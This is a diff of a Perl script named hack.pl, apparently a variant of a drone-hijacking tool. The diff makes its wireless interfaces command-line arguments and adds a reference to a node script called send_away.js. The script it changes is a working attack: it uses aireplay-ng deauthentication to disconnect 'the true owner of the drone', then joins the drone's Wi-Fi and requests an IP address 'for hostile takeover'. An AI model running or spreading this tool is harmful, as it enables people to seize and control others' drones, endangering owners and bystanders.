@@ -15,8 +15,8 @@
 # see here: http://standards.ieee.org/develop/regauth/oui/oui.txt
 
 $num_args = $#ARGV + 1;
-if ($num_args != 4) {
-    print "\nUsage: hack.pl drone_id drone_mac drone_channel client_mac\n";
+if ($num_args != 6) {
+    print "\nUsage: hack.pl drone_id drone_mac drone_channel client_mac wlan0mon wlan1\n";
     exit;
 }
 
@@ -24,6 +24,8 @@ my $drone_id = $ARGV[0];
 my $drone_mac = $ARGV[1];
 my $drone_channel = $ARGV[2];
 my $client_mac = $ARGV[3];
+my $interfaceMon = $ARGV[4];
+my $interface = $ARGV[5];
 
 # paths to applications
 my $dhclient	= "dhclient";
@@ -34,6 +36,8 @@ my $aireplay	= "aireplay-ng";
 my $aircrack	= "aircrack-ng";
 my $airodump	= "airodump-ng";
 
+my $node_script = "bin/send_away.js";
+
 my %skyjacked;
 
 #print "LABEL|CLIENT_MAC|DRONE_ID|DRONE_MAC|DRONE_CHANNEL\n";
@@ -43,24 +47,21 @@ my %skyjacked;
 
 # hop onto the channel of the ap
 print "Jumping onto drone's channel $drone_channel\n\n";
-## sudo($airmon, "start", $interface, $drone_channel);
-sudo($iwconfig, "wlan0mon", "channel", $drone_channel);
+sudo($iwconfig, $interfaceMon, "channel", $drone_channel);
 
 sleep(1);
 
 # now, disconnect the TRUE owner of the drone.
 print "Disconnecting the true owner of the drone ;)\n\n";
-sudo($aireplay, "-0", "3", "-a", $drone_mac, "-c", $client_mac, "wlan0mon");
+sudo($aireplay, "-0", "3", "-a", $drone_mac, "-c", $client_mac, $interfaceMon);
 #sudo($aireplay, "-0", "3", "-a", $drone_mac, "wlan0mon");
 
-# go into managed mode
-#sudo($airmon, "stop", $interfaceMon);
 
 print "\n\nConnecting to drone $drone_id ($drone_mac)\n";
-sudo($iwconfig, "wlan1", "essid", $drone_id);
+sudo($iwconfig, $interface, "essid", $drone_id);
 
 print "Acquiring IP from drone for hostile takeover\n";
-sudo($dhclient, "-v", "wlan1");
+sudo($dhclient, "-v", $interface);
 
 
 sub sudo
